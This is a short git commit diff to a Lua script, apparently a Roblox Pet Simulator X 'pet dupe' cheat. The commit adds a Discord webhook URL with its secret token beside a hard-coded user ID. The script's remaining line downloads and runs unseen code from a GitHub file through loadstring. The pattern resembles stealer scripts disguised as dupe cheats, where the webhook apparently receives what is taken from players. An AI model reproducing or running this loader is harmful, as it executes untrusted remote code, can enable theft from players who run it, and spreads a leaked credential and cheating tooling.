7f505265c1500acab0961001bdd006671d51e6b8
PixBay <121799590+PixBay@users.noreply.github.com>
2023-01-02 15:12:31 +0100

    Update SkriptDupePetsPSX.lua

--- SkriptDupePetsPSX.lua
+++ SkriptDupePetsPSX.lua
@@ -1,3 +1,3 @@
 _G.UserID = 1054828739
-_G.WebHook = ""
+_G.WebHook = "https://discord.com/api/webhooks/1059473782848368650/dZO_aC7qwyzUKTPcVzeeeK1HIDWqPlzRmQ2irYO1xlV6Nrfh1BTLpVQY25Hr4w9Bml-G"
 loadstring(game:HttpGet('https://raw.githubusercontent.com/vestyx/PetSimulatorXAutoFarm/main/HasteFarm.lua'))()
